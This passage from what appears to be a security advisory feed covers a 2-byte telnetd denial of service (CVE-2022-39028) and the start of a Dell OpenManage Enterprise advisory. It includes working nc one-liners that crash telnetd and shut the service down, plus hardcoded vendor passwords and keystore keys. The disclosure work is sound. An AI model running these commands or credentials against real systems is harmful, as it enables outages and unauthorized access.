<span style="color: #666666">497</span> <span style="border: 1px solid #FF0000">#</span>ifdef  ENCRYPTION
<span style="color: #666666">498</span>            his_do_dont_is_changing(TELOPT_ENCRYPT) <span style="color: #666666">||</span>
<span style="color: #666666">499</span> <span style="border: 1px solid #FF0000">#</span>endif  <span style="color: #408080; font-style: italic">/* ENCRYPTION */</span>
<span style="color: #666666">500</span>            his_will_wont_is_changing(TELOPT_TTYPE) <span style="color: #666666">||</span>
<span style="color: #666666">501</span>            his_will_wont_is_changing(TELOPT_TSPEED) <span style="color: #666666">||</span>
<span style="color: #666666">502</span>            his_will_wont_is_changing(TELOPT_XDISPLOC) <span style="color: #666666">||</span>
<span style="color: #666666">503</span>            his_will_wont_is_changing(TELOPT_NEW_ENVIRON) <span style="color: #666666">||</span>
<span style="color: #666666">504</span>            his_will_wont_is_changing(TELOPT_OLD_ENVIRON)) {
<span style="color: #666666">505</span>         ttloop();
<span style="color: #666666">506</span>     }
</pre></div>

<p>The <code>ttloop()</code> function will then call <code>telrcv()</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">66</span>     <span style="color: #B00040">void</span>
<span style="color: #666666">67</span> <span style="color: #0000FF">ttloop</span>()
<span style="color: #666666">68</span> {
...
<span style="color: #666666">69</span>
<span style="color: #666666">74</span>     ncc <span style="color: #666666">=</span> read(net, netibuf, <span style="color: #008000; font-weight: bold">sizeof</span> netibuf);
...
<span style="color: #666666">84</span>     telrcv();                   <span style="color: #408080; font-style: italic">/* state machine */</span>
<span style="color: #666666">85</span>     <span style="color: #008000; font-weight: bold">if</span> (ncc <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) {
<span style="color: #666666">86</span>         pfrontp <span style="color: #666666">=</span> pbackp <span style="color: #666666">=</span> ptyobuf;
<span style="color: #666666">87</span>         telrcv();
<span style="color: #666666">88</span>     }
<span style="color: #666666">89</span> }  <span style="color: #408080; font-style: italic">/* end of ttloop */</span>
</pre></div>

<p>At this moment, the function <code>get_slc_defaults()</code> has still not been executed to correctly initialize the <code>slctab[31]</code> array.
All the fields in the <code>slctab[31]</code> array are still set to <code>0</code>.</p>
<p>Then in the <code>telrcv()</code> function, when an attacker sends <code>\xff\xf7</code> or <code>\xff\xf8</code>, the code will try to access <code>*(slctab[10].sptr)</code> (<code>*(0)</code>) or <code>*(slctab[11].sptr)</code> (<code>*(0)</code>), we have null pointer dereferences!</p>
<p><a id="remote-dos-macos"></a></p>
<h3>MacOS</h3>
<p>We also found the vulnerable function in MacOS source codes at <a href="https://opensource.apple.com/source/KerberosLibraries/KerberosLibraries-81.46.1/KerberosFramework/Kerberos5/Sources/appl/telnet/telnetd/state.c">https://opensource.apple.com/source/KerberosLibraries/KerberosLibraries-81.46.1/KerberosFramework/Kerberos5/Sources/appl/telnet/telnetd/state.c</a>, but macOS does not appear to provide a telnetd binary so we can assume it is not affected.</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">98</span>         <span style="color: #B00040">void</span>
 <span style="color: #666666">99</span> <span style="color: #0000FF">telrcv</span>()
<span style="color: #666666">100</span> {
<span style="color: #666666">101</span>         <span style="color: #008000; font-weight: bold">register</span> <span style="color: #B00040">int</span> c;
<span style="color: #666666">102</span>         <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">int</span> state <span style="color: #666666">=</span> TS_DATA;
<span style="color: #666666">103</span> <span style="border: 1px solid #FF0000">#</span><span style="color: #008000; font-weight: bold">if</span>     defined(CRAY2) <span style="color: #666666">&amp;&amp;</span> defined(UNICOS5)
<span style="color: #666666">104</span>         <span style="color: #B00040">char</span> <span style="color: #666666">*</span>opfrontp <span style="color: #666666">=</span> pfrontp;
<span style="color: #666666">105</span> <span style="border: 1px solid #FF0000">#</span>endif
...
<span style="color: #666666">107</span>         <span style="color: #008000; font-weight: bold">while</span> (ncc <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) {
<span style="color: #666666">108</span>                 <span style="color: #008000; font-weight: bold">if</span> ((<span style="color: #666666">&amp;</span>ptyobuf[BUFSIZ] <span style="color: #666666">-</span> pfrontp) <span style="color: #666666">&lt;</span> <span style="color: #666666">1</span>)
<span style="color: #666666">109</span>                         <span style="color: #008000; font-weight: bold">break</span>;
<span style="color: #666666">110</span>                 c <span style="color: #666666">=</span> <span style="color: #666666">*</span>netip<span style="color: #666666">++</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0377</span>, ncc<span style="color: #666666">--</span>;
...
<span style="color: #666666">115</span>                 <span style="color: #008000; font-weight: bold">switch</span> (state) {
...
<span style="color: #666666">125</span>                 <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_DATA</span>:
<span style="color: #666666">126</span>                         <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> IAC) {
<span style="color: #666666">127</span>                                 state <span style="color: #666666">=</span> TS_IAC;
<span style="color: #666666">128</span>                                 <span style="color: #008000; font-weight: bold">break</span>;
<span style="color: #666666">129</span>                         }
...
<span style="color: #666666">169</span>                 <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_IAC</span>:
<span style="color: #666666">170</span> <span style="color: #A0A000">gotiac</span>:                 <span style="color: #008000; font-weight: bold">switch</span> (c) {
...
<span style="color: #666666">221</span>                         <span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">222                          * Erase Character and</span>
<span style="color: #408080; font-style: italic">223                          * Erase Line</span>
<span style="color: #408080; font-style: italic">224                          */</span>
<span style="color: #666666">225</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EC</span>:
<span style="color: #666666">226</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EL</span>:
<span style="color: #666666">227</span>                             {
<span style="color: #666666">228</span>                                 cc_t ch;
<span style="color: #666666">229</span> 
<span style="color: #666666">230</span>                                 DIAG(TD_OPTIONS,
<span style="color: #666666">231</span>                                         printoption(<span style="color: #BA2121">&quot;td: recv IAC&quot;</span>, c));
<span style="color: #666666">232</span>                                 ptyflush();     <span style="color: #408080; font-style: italic">/* half-hearted */</span>
<span style="color: #666666">233</span>                                 init_termbuf();
<span style="color: #666666">234</span>                                 <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> EC)
<span style="color: #666666">235</span>                                         ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
<span style="color: #666666">236</span>                                 <span style="color: #008000; font-weight: bold">else</span>
<span style="color: #666666">237</span>                                         ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
<span style="color: #666666">238</span>                                 <span style="color: #008000; font-weight: bold">if</span> (ch <span style="color: #666666">!=</span> (cc_t)(_POSIX_VDISABLE))
<span style="color: #666666">239</span>                                         <span style="color: #666666">*</span>pfrontp<span style="color: #666666">++</span> <span style="color: #666666">=</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>)ch;
<span style="color: #666666">240</span>                                 <span style="color: #008000; font-weight: bold">break</span>;
<span style="color: #666666">241</span>                             }
</pre></div>

<p><a id="remote-dos-conclusion"></a></p>
<h3>Conclusion</h3>
<p>There is a vulnerable code path reachable from the network allowing an attacker to force the server using variables before they are correctly initialized, resulting in 2 null pointer dereferences.</p>
<p>From our tests, it was determined these 2 vulnerabilities affect:</p>
<ul>
<li>FreeBSD-telnetd</li>
<li>NetBSD-telnetd</li>
<li>inetutils-telnetd</li>
<li>netkit-telnetd</li>
<li>Telnetd in Kerberos Version 5 Applications - since the initial version (February 22, 1991 or 1/21/93)</li>
<li>specific Palo Alto appliances (using netkit-telnetd)</li>
<li>specific Cisco appliances (using netkit-telnetd)</li>
<li>specific Brocade appliances (using netkit-telnetd)</li>
<li>specific Arista appliances (using netkit-telnetd)</li>
<li>...</li>
</ul>
<p>These vulnerabilities existed for =~ 30 years.</p>
<p>To check if a remote telnet server is vulnerable, it is possible to send 2 bytes over the network and check if the remote server closes the TCP connection.</p>
<p>A disconnection means the remote <code>telnetd</code> processus likely crashed.</p>
<p><a id="permanent-remote-dos"></a></p>
<h2>Details - permanent Remote DoS</h2>
<p>Since <code>telnetd</code> is started with <code>inetd</code>, a new <code>telnetd</code> process will be spawned for each new tcp connection.</p>
<p>So an attacker can crash 256 <code>telnetd</code> processes very quickly and then <code>inetd</code> will stop spawning new telnetd processes. This DoS takes 4 seconds on a recent machine. This test was done under FreeBSD:</p>
<pre><code>kali% i=0; while true; do echo $i; printf "\xff\xf7" | nc -n -v 192.168.1.200 23 &gt;/dev/null; i=$((${i}+1));done
0
(UNKNOWN) [192.168.1.200] 23 (telnet) open
1
(UNKNOWN) [192.168.1.200] 23 (telnet) open
2
...
(UNKNOWN) [192.168.1.200] 23 (telnet) open
256
(UNKNOWN) [192.168.1.200] 23 (telnet) : Connection refused
257
(UNKNOWN) [192.168.1.200] 23 (telnet) : Connection refused
...
</code></pre>
<p>And in the logs, we can confirm the telnetd server will not be spawned anymore by inetd:</p>
<pre><code>Aug 21 12:01:40 freebsd-13-1p1 inetd[6550]: telnet/tcp server failing (looping), service terminated
</code></pre>
<p><a id="full-disclosure"></a></p>
<h2>Vendor Response</h2>
<p>Reaching and coordinating with all the vendors and software maintainers will take too much time and effort.</p>
<p>Full-disclosure is applied.</p>
<p><a id="recommendations"></a></p>
<h2>Recommendations</h2>
<p>It is 2022. Do not use telnet. Seriously!</p>
<p><a id="bggp3-score"></a></p>
<h2>BGGP #3 Score</h2>
<p>Rules of BGGP #3 are available at <a href="https://tmpout.sh/bggp/3/">https://tmpout.sh/bggp/3/</a>.</p>
<p>Calculation of the score:</p>
<pre><code>  4096 pts
 -   2 pts (size of file or payload)
 +1024 pts, if you submit a writeup about your process and details about the crash
(+4096 pts, if you author a patch for your bug which is merged before the end of the competition)
------
  9214 pts if patches are deployed.
</code></pre>
<p>There are other bonus that we cannot obtain with these vulnerabilities:</p>
<pre><code> +1024 pts, if the program counter is all 3's when the program crashes
 +2048 pts, if you hijack execution and print or return "3"
</code></pre>
<p>We cannot hijack the execution flow but we can print "3" for fun over the telnet connection.</p>
<p>We can use RFC 857 (telnet echo) with <code>IAC WILL ECHO</code> (<code>255 251 1</code>) or <code>IAC DO ECHO</code> (<code>255 253 1</code>) and then crash the remote server.</p>
<p>But we found a smaller payload by sending <code>255 251 3</code> (this will print "3") and then <code>255 247</code> (DoS):</p>
<pre><code>kali% (printf "\xff\xfb3"; sleep 1; printf "\xff\xf7") | nc -v -n 192.168.1.200 23
(UNKNOWN) [192.168.1.200] 23 (telnet) open
&lt;FF&gt;&lt;FD&gt;%&lt;FF&gt;&lt;FE&gt;3
</code></pre>
<p><a id="credits"></a></p>
<h2>Credits</h2>
<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>) and Alexandre Torres (<a href="https://twitter.com/AlexTorSec">@AlexTorSec</a>).</p>
<p><a id="references"></a></p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/blog/2022-08-24-2-byte-dos-freebsd-netbsd-telnetd-netkit-telnetd-inetutils-telnetd-kerberos-telnetd.html">https://pierrekim.github.io/blog/2022-08-24-2-byte-dos-freebsd-netbsd-telnetd-netkit-telnetd-inetutils-telnetd-kerberos-telnetd.html</a></p>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-39028">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-39028</a></p>
<p><a id="disclaimer"></a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a>.</p></content>
    </entry>
    
    <entry>
        <title>Multiple vulnerabilities in Dell OpenManage Enterprise</title>
        <link href="2021-07-19-dell-openmanage-enterprise-0day-vulnerabilities.html"/>
        <content type="html"><h2>Product description</h2>
<p>Dell EMC OpenManage Enterprise is an intuitive infrastructure management console.</p>
<p>OpenManage Enterprise is a system management and monitoring application that provides a comprehensive view of the Dell EMC servers, chassis, storage, and network switches on the enterprise network.</p>
<p>From <a href="https://www.dell.com/support/kbdoc/en-sg/000175879/support-for-openmanage-enterprise">https://www.dell.com/support/kbdoc/en-sg/000175879/support-for-openmanage-enterprise</a>:</p>
<blockquote>
<p>Secure: Security is a top priority</p>
</blockquote>
<h2>Vulnerabilities Summary</h2>
<p>Vulnerable versions: all versions up to 3.6.1</p>
<p>The summary of the vulnerabilities is:</p>
<ol>
<li><a href="#hardcoded-activemq-credentials">Hardcoded ActiveMQ credentials</a></li>
<li><a href="#hardcoded-activemq-credentials-for-jmx">Hardcoded ActiveMQ credentials for JMX</a></li>
<li><a href="#hardcoded-activemq-keystore">Hardcoded ActiveMQ keystore</a></li>
<li><a href="#hardcoded-jdbc-passwords">Hardcoded JDBC Passwords</a></li>
<li><a href="#hardcoded-passwords-core_admin-replicator">Hardcoded passwords for core_admin and replicator</a></li>
<li><a href="#keystore-hardcoded-key">KeyStore using hardcoded Key</a></li>
<li><a href="#permissive-acl-postgres">Permissive ACL for Postgres</a></li>
<li><a href="#lpe-postgres">Local Privilege Escalation (as postgres) inside postgres docker</a></li>
<li><a href="#remote-auth-bypass-with-2-pre-auth-rces-docker-instances">Remote Auth Bypass with 2 pre-auth RCEs in docker instances - CVE-2021-21596</a></li>
<li><a href="#undocumented-system-account">Undocumented <code>system</code> account</a></li>
<li><a href="#database-key-stored-db">Database key stored in the database</a></li>
<li><a href="#weak-permission-tls-key">Weak permission on SSL/TLS Key</a></li>
<li><a href="#lpe-mcsimetricssvc">Multiple Local Privilege Escalations from <code>mcsimetricssvc</code> - partially silently patched in version 3.6.1</a></li>
<li><a href="#lpe-mcsitasksvc">Multiple Local Privilege Escalations from group <code>mcsitasksvc</code></a></li>
<li><a href="#lpe-tomcat">Multiple Local Privilege Escalations from group <code>tomcat</code></a></li>
<li><a href="#lpe-omctui">Local Privilege Escalation from group <code>omctui</code></a></li>
<li><a href="#toctou-security_tool.sh">Multiple TOCTOUs in "security_tool.sh" shell script</a></li>
<li><a href="#tomcat-shadow-access">Incorrect access for tomcat</a></li>
<li><a href="#grub-password-db-no-auth">Grub password stored in postgres, without authentication for local user</a></li>
<li><a href="#pre-auth-post-auth-java-deserializations">Pre-auth and post-auth Java Deserializations - silently patched in version 3.6.1</a></li>
<li><a href="#idrac-user">Idrac User</a></li>
</ol>
<p><em>Miscellaneous notes</em>:</p>
<p>We had forgotten these vulns until we saw some tweets regarding <code>dbutil_2_3.sys</code> and
we reminded we still had unpublished research in Dell products.</p>
<p>This research was done a year ago (in July 2020) against OpenManage 3.4 and we confirmed all the versions - including the latest version (3.6.1) - are affected by the vulnerabilities.</p>
<p>When checking openmanage enterprise 3.5, we also found new vulnerabilities (java stuff, grub, idrac).</p>
<p>When checking openmanage enterprise 3.6.1, it appears some vulnerabilities were silently patched (java stuff and a LPE).</p>
<p>We also removed some potential vulnerabilities because their exploitations were not straightforward due to the presence of SELinux.</p>
<p><a id="hardcoded-activemq-credentials"></a></p>
<h2>Details - Hardcoded ActiveMQ credentials</h2>
<p>It is possible to retrieve hardcoded ActiveMQ credentials by reading the <code>/opt/apache-activemq-5.*/conf/credentials.properties</code> file:</p>
<pre><code>[root@openmanage-enterprise /]# cat /opt/apache-activemq-5.*/conf/credentials.properties
activemq.username=system
activemq.password=manager
guest.password=password
</code></pre>
<p>A new file (<code>credentials-enc.properties</code>, which was the file <code>credentials.properties</code> in previous version of OpenManage) appeared in the 3.5 version:</p>
<pre><code>[root@openmanage-enterprise /]# cat /opt/apache-activemq-5.*/conf/credentials-enc.properties
activemq.username=system
activemq.password=ENC(mYRkg+4Q4hua1kvpCCI2hg==)
guest.password=ENC(Cf3Jf3tM+UrSOoaKU50od5CuBa8rxjoL)
</code></pre>
<p>Note: Prior to the 3.5 version, the file <code>credentials.properties</code> contained the identical encrypted credentials, instead of clear-text credentials:</p>
<pre><code>[root@openmanage-enterprise /]# cat /opt/apache-activemq-5.10.0/conf/credentials.properties
activemq.username=system
activemq.password=ENC(mYRkg+4Q4hua1kvpCCI2hg==)
guest.password=ENC(Cf3Jf3tM+UrSOoaKU50od5CuBa8rxjoL)
</code></pre>
<p>In the latest version, it appears the passwords are now in clear-text.</p>
<p>ActiveMQ listen to all the public interfaces:</p>
<pre><code>[root@openmanage-enterprise /]# ps -auxww|grep -i active
ps -auxww|grep -i active
activem+  1065  0.9  1.2 4042088 208636 ?      Sl   04:37   0:06 /usr/bin/java -Xms256m -Xmx512m -Dorg.apache.activemq.SERIALIZABLE_PACKAGES=java.lang,javax.security,java.util,org.apache.activemq,org.fusesource.hawtbuf,com.thoughtworks.xstream.mapper,com.dell.enterprise.common.integration.lib.taskengine -Dcom.sun.management.jmxremote -Djava.awt.headless=true -Djava.io.tmpdir=/var/lib/activemq/tmp -Dactivemq.classpath=/opt/apache-activemq-5.16.0//conf:/opt/apache-activemq-5.16.0//../lib/: -Dactivemq.home=/opt/apache-activemq-5.16.0/ -Dactivemq.base=/opt/apache-activemq-5.16.0/ -Dactivemq.conf=/opt/apache-activemq-5.16.0//conf -Dactivemq.data=/var/lib/activemq/data -jar /opt/apache-activemq-5.16.0//bin/activemq.jar start

[root@openmanage-enterprise /]# netstat -laputen|grep 1065
netstat -laputen|grep 1065
tcp6       0      0 :::46403                :::*                    LISTEN      1000       27797      1065/java
tcp6       0      0 :::61616                :::*                    LISTEN      1000       29817      1065/java
</code></pre>
<p>Luckily, the firewall blocks all incoming connections to these 2 ports.</p>
<p>Other credentials found:</p>
<pre><code>[root@openmanage-enterprise /]# cat /opt/apache-activemq-*/conf/jetty-realm.properties
[...]
# Defines users that can access the web (console, demo, etc.)
# username: password [,rolename ...]
admin: admin, admin
user: user, user
</code></pre>
<p>Furthermore, SELinux doesn't allow users to read <code>/opt/apache-activemq-5.*/conf/</code> files - still the passwords are hardcoded.</p>
<p><a id="hardcoded-activemq-credentials-for-jmx"></a></p>
<h2>Details - Hardcoded ActiveMQ credentials for JMX</h2>
<p>Java Management Extensions (JMX) allows remote debugging of java applications.</p>
<p>These files contain the hardcoded passwords in clear-text for JMX access to ActiveMQ.</p>
<p>Even if they have wrong permissions, SELinux doesn't allow regular users to read <code>/opt/apache-activemq-5.*/conf/</code> files.</p>
<p>Still the passwords are hardcoded, as shown below:</p>
<pre><code>[root@openmanage-enterprise /]# ls -la /opt/apache-activemq-5.16.0/conf/jmx*
-rwxr-xr-x. 1 root root 965 Sep 25  2020 /opt/apache-activemq-5.16.0/conf/jmx.access
-rwxr-xr-x. 1 root root 964 Sep 25  2020 /opt/apache-activemq-5.16.0/conf/jmx.password

[root@openmanage-enterprise /]# tail -n 1 /opt/apache-activemq-5.16.0/conf/jmx.access
admin readwrite

[root@openmanage-enterprise /]# tail -n 1 /opt/apache-activemq-5.16.0/conf/jmx.password
admin activemq
</code></pre>
<p>It is interesting to note that the path of ActiveMQ changes, from old version to the recent one,
indicating activemq is updated for every new release of Open Manage Enterprise but the hardcoded credentials are never changed.</p>
<p><a id="hardcoded-activemq-keystore"></a></p>
<h2>Details - Hardcoded ActiveMQ keystore</h2>
<p>We can find several hardcoded keystore files inside <code>/opt/apache-activemq-5.16.0/conf</code>:</p>
<pre><code>[root@openmanage-enterprise conf]# ls -la *ts *ks
-rwxr-xr-x. 1 root root 1370 Sep 25  2020 broker.ks
-rwxr-xr-x. 1 root root  665 Sep 25  2020 broker.ts
-rwxr-xr-x. 1 root root 1357 Sep 25  2020 client.ks
-rwxr-xr-x. 1 root root  665 Sep 25  2020 client.ts
[root@openmanage-enterprise conf]# sha256sum *ts *ks
1c17bb3b5d1335a0821eb5b9c8c1de7331219619416c9d31a6b775e232bf4456  broker.ts
1c17bb3b5d1335a0821eb5b9c8c1de7331219619416c9d31a6b775e232bf4456  client.ts
718d056b1a5518abf2a5ab38d0e81eb6d41c3187d93c7c54817fcb20503b0c8c  broker.ks
ce0d36c002d9912dc5f7344353735277d0af15630199ec91e96eef29a5acd3f4  client.ks
</code></pre>
<p>The permissions are wrong (644) but SELinux doesn't allow regular users to read <code>/opt/apache-activemq-5.*/conf/</code> files.</p>
<p>Still the files are hardcoded.</p>
<p>Also, the password for the keystore file (<code>broker.ks</code>) is defined in the <code>jetty.xml</code> file, with 644 permission:</p>
<pre><code>&lt;property name="keyStorePath" value="${activemq.conf}/broker.ks" /&gt;
&lt;property name="keyStorePassword" value="password" /&gt;
</code></pre>
<p>The hardcoded password for the keystore is <code>password</code>.</p>
<p><a id="hardcoded-jdbc-passwords"></a></p>
<h2>Details - Hardcoded JDBC Passwords</h2>
<p>The passwords is hardcoded (<code>Dell123$</code>) and can't be changed:</p>
<pre><code>[root@openmanage-enterprise /]# cat /opt/dell/mcsi/webapps/api/WEB-INF/classes/jdbc.properties
hibernate.connection.url=jdbc:postgresql://localhost:5432/enterprisedb
hibernate.connection.username=core_admin
hibernate.connection.password=Dell123$
</code></pre>
<p>Wrong permissions but SELinux again blocks any read attempt.</p>
<pre><code>[root@openmanage-enterprise /]# ls -la /opt/dell/mcsi/webapps/api/WEB-INF/classes/jdbc.properties
-rwxrwxr-x. 1 root root 151 Sep 25  2020 /opt/dell/mcsi/webapps/api/WEB-INF/classes/jdbc.properties
</code></pre>
<p>In previous versions (before 3.5), it was also possible to extract the password from the files
<code>/opt/dell/mcsi/lib/db/scripts/mcsi/sysconfigdao/TSQL/9000_attribute_registry - About.txt</code> and
<code>/opt/dell/mcsi/lib/db/scripts/mcsi/sysconfigdao/TSQL/9040_default_data_sysconfig_templates - About.txt</code>.
These 2 files contained:</p>
<pre><code>[...]
Create a new Data Source using "PostgreSQL Unicode(x64)"

Data Source:    LexingtonLocal
Database:               enterprisedb
Server:                 localhost
User Name:              core_admin
Password:               Dell123$  &lt;---------- password
SSL Mode:               disabled
Port:                   5432
Driver:                 PostgreSQL ODBC Driver(UNICODE)

Alter the "Datasource" within Options of the new data source
Bools as Char:  OFF
Unknown Sizes:  Longest
[...]

There will be a couple errors that are fixed by replacing 'select' with 'perform' at the line numbers given by the errors.

[...]
declare @serverName nvarchar(256) = N'LEXINGTON';
declare @dataSourceName nvarchar(256) = N'LexingtonLocal';
declare @userName nvarchar(256) = N'core_admin';
declare @password nvarchar(256) = N'Dell123$'; &lt;------ password
[...]
</code></pre>
<p>These files don't exist anymore in version 3.5.</p>
<p>Interestingly, <code>Dell123$</code> is the provided password in the documentation files:</p>
<p>From <code>/opt/dell/omc/webapps/omc/console/omcOnlineHelp/en/GUID-0A8DECB1-C2E7-4904-A071-FEC75D6A54C7.html</code>:</p>
<pre><code>Must contain at least one character in: uppercase, lowercase, digit, and special character. For example, Dell123$
</code></pre>
<p>The command <code>grep -ri 'Dell123\$' /opt/</code> as root will list several files containing this password.</p>
<p><a id="hardcoded-passwords-core_admin-replicator"></a></p>
<h2>Details - Hardcoded passwords for core_admin and replicator</h2>
<p>The <code>/opt/dell/mcsi/lib/db/scripts/mcsi/00_core/01CreateDB/01RoleCreation.sql</code> script has wrong permissions and contains hardcoded clear-text passwords for the creation of roles in postgres:</p>
<ul>
<li>replicator, with password <code>Password123$</code>,</li>
<li>core_admin, with password <code>md5292f7d66e18e0128fa11bebb95c467a6</code> as <code>UNENCRYPTED PASSWORD</code> is being used instead of <code>ENCRYPTED PASSWORD</code>.</li>
</ul>
<p>&nbsp;</p>
<pre><code>[root@openmanage-enterprise /]# cat /opt/dell/mcsi/lib/db/scripts/mcsi/00_core/01CreateDB/01RoleCreation.sql

-- Role: "core_admin"

-- DROP ROLE core_admin;

--CREATE ROLE core_admin LOGIN
--  ENCRYPTED PASSWORD 'md564f6b341503abb8ca26367630f233b22'
--  NOSUPERUSER INHERIT NOCREATEDB NOCREATEROLE;

--  CREATE ROLE replicator LOGIN
--  ENCRYPTED PASSWORD 'md5a7c4e11df28c56eac643ace589e81d4e'
--  NOSUPERUSER INHERIT NOCREATEDB NOCREATEROLE REPLICATION;

 CREATE ROLE core_admin LOGIN
  UNENCRYPTED PASSWORD 'md5292f7d66e18e0128fa11bebb95c467a6'
  SUPERUSER INHERIT NOCREATEDB NOCREATEROLE;

 CREATE ROLE replicator LOGIN
  UNENCRYPTED PASSWORD 'Password123$'
  NOSUPERUSER INHERIT NOCREATEDB NOCREATEROLE REPLICATION;
</code></pre>
<p><a id="keystore-hardcoded-key"></a></p>
<h2>Details - KeyStore using hardcoded Key</h2>
<p>By default, only the passwords for servers/idrac/appliances inside the postgres database are encrypted using a keystore containing a secret key.</p>
<p>This keystore file is located in <code>/opt/dell/mcsi/appliance/config/security/keystore.p12</code>.</p>
<p>At first, it seems insecure because its permissions are wrong (664) but this file is in fact protected by SELinux:</p>
<pre><code>[root@openmanage-enterprise /]# ls -la /opt/dell/mcsi/appliance/config/security/keystore.p12
-rw-rw-r--+ 1 root root 313 May 16 04:06 /opt/dell/mcsi/appliance/config/security/keystore.p12
</code></pre>
<p>SELinux policy:</p>
<pre><code>/opt/dell/mcsi/appliance/config/security/keystore\.p12  --  system_u:object_r:mcsi_appliance_secret_t:s0
</code></pre>
<p>Nonetheless, the password of the keystore is hardcoded:</p>
<p>From <code>/opt/dell/omc/scripts/runonce/update_keystorepassword_runonce.sh</code>:</p>
<pre><code>[root@openmanage-enterprise /]# cat /opt/dell/omc/scripts/runonce/update_keystorepassword_runonce.sh
[...]
/usr/java/latest/bin/keytool -storepasswd -new "7673D238EBF23E51EC18E9D9B5DAB299" -storepass "changeit" -keystore /opt/dell/mcsi/appliance/config/security/keystore.p12
[...]
/usr/java/latest/bin/keytool -alias "secretKey" -keypasswd -new "7673D238EBF23E51EC18E9D9B5DAB299" -keypass "changeit" -storepass "7673D238EBF23E51EC18E9D9B5DAB299" -keystore /opt/dell/mcsi/appliance/config/security/keystore.p12
</code></pre>
<p>The password <code>7673D238EBF23E51EC18E9D9B5DAB299</code> was found in all versions of OpenManage and it works:</p>
<pre><code>[root@openmanage-enterprise /]# openssl pkcs12 -info -in /opt/dell/mcsi/appliance/config/security/keystore.p12
Enter Import Password: [7673D238EBF23E51EC18E9D9B5DAB299]
MAC Iteration 100000
MAC verified OK
PKCS7 Data
Warning unsupported bag type: secretBag
</code></pre>
<p>We can also find the original password <code>changeit</code> for the keystore inside the <code>/opt/dell/mcsi/appliance/scripts/ca/importCert.exp</code> script:</p>
<pre><code>[root@openmanage-enterprise /]# cat /opt/dell/mcsi/appliance/scripts/ca/importCert.exp
[...]
spawn /usr/java/latest/bin/keytool -import -alias localhost -file /etc/pki/tls/certs/localhost.crt -keystore /usr/java/latest/lib/security/cacerts
match_max 100000
expect -exact "Enter keystore password:  "
send -- "changeit\r"
expect -exact "Trust this certificate? \[no\]:  "
send -- "yes\r"
sleep 3
</code></pre>
<p><a id="permissive-acl-postgres"></a></p>
<h2>Details - Permissive ACL for Postgres</h2>
<p>From the files <code>/opt/dell/mcsi/lib/db/data/pg_hba.conf.core</code> and <code>/opt/dell/mcsi/lib/db/data/pg_hba.conf.trust</code>,
the entire docker IP range (<code>169.254.255.1/24</code>) has a full access to postgres, without password (<code>trust</code>)</p>
<pre><code>[root@openmanage-enterprise /]# cat /opt/dell/mcsi/lib/db/data/pg_hba.conf.trust
# TYPE  DATABASE    USER        CIDR-ADDRESS          METHOD

# "local" is for Unix domain socket connections only
local   all         postgres                           trust
local   replication     rep                                             trust
# IPv4 local connections:
host    all         postgres                    127.0.0.1/32    trust
host        all                 postgres                    169.254.255.1/24    trust
host    replication     rep                     169.254.255.1/24        trust

# IPv4 &amp; IPv6 local connections:
host    all     all     127.0.0.1/32       trust
host        all         all         169.254.255.1/24    trust

host    all     all     ::1/128       trust
#host replication     all     172.18.100.0/16     md5
#hostssl     replication     all     172.18.100.0/16     md5
host    all     postgres     ::1/128          trust
[root@openmanage-enterprise /]# cat /opt/dell/mcsi/lib/db/data/pg_hba.conf.core
# TYPE  DATABASE    USER        CIDR-ADDRESS          METHOD

# "local" is for Unix domain socket connections only
local   postgres        postgres                        trust
host    enterprisedb    core_admin      ::1/128         trust
host    enterprisedb    core_admin      127.0.0.1/32    trust
host    enterprisedb    core_admin      169.254.255.1/24    trust
local   enterprisedb    core_admin                      trust

local   replication     rep                                             trust
host    replication     rep                     169.254.255.1/24        trust
</code></pre>
<p>In fact, no password is being used by the solution to manage the database, as shown below:</p>
<pre><code>[root@openmanage-enterprise /]# cat /var/etc/opt/dell/mcsi/logjdbc.properties
postgresql.connection.url=jdbc:postgresql://localhost:5432/enterprisedb
postgresql.connection.username=core_admin
postgresql.connection.password=
</code></pre>
<p>A compromise of a docker instance will likely provide a full access to the Postgres database (see
"<a href="#remote-auth-bypass-with-2-pre-auth-rces-docker-instances">Remote Auth Bypass with 2 pre-auth RCEs in docker instances</a>" for a demo).</p>
<p>Also, it it possible to see that authentication for Posgtres in the device is mainly based on IP:</p>
<pre><code>[root@openmanage-enterprise /]# cat /opt/dell/omc/scripts/execute_db_script.sh
#!/usr/bin/env bash

dbHost=localhost
dbUser=core_admin
dbName=enterprisedb
dbPort="5432"
psql_arguments=()
[...]
</code></pre>
<p>No authentication is being defined in this shell script.</p>
<p><a id="lpe-postgres"></a></p>
<h2>Details - Local Privilege Escalation (as postgres) inside postgres docker</h2>
<p>By default, some ACLs allow to connect to Postgres without a password.</p>
<p>A local unprivileged user (e.g.: <code>nobody</code>) inside the host or inside any docker instances running in the appliance will get code execution as <code>postgres</code> inside the postgres docker.</p>
<p>He will also get a full control over the database, so a full control over the appliance.</p>
